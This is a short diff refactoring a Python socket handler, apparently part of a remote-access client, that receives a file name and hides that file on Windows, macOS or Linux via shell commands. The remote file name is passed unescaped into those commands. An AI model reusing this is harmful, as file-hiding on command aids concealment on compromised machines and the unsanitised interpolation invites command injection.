@@ -5,17 +5,19 @@ f_name = receive(client_socket)
 system = sys.platform
 if os.path.exists(f_name):
     if win_client():
-        resp = run_command("attrib +H {}".format(f_name))
+        resp = run_command(f"attrib +H {f_name}")
     if osx_client():
-        resp = run_command("chflags hidden {}".format(f_name))
-    if lnx_client() and f_name.startswith('.') :
-        resp = '[*] File is already hidden.\n'
-    elif lnx_client():
-        resp = run_command("mv {} .{}".format(f_name,f_name))
-else:
+        resp = run_command(f"chflags hidden {f_name}")
     if lnx_client():
-        if os.path.exists(".{}".format(f_name)):
-            resp = '[*] File is already hidden.\n'
-    else:
-        resp = "[!] {}: No such file or directory\n".format(f_name)
+        resp = (
+            '[*] File is already hidden.\n'
+            if f_name.startswith('.')
+            else run_command(f"mv {f_name} .{f_name}")
+        )
+
+elif lnx_client():
+    if os.path.exists(f".{f_name}"):
+        resp = '[*] File is already hidden.\n'
+else:
+    resp = f"[!] {f_name}: No such file or directory\n"
 send(client_socket,resp)
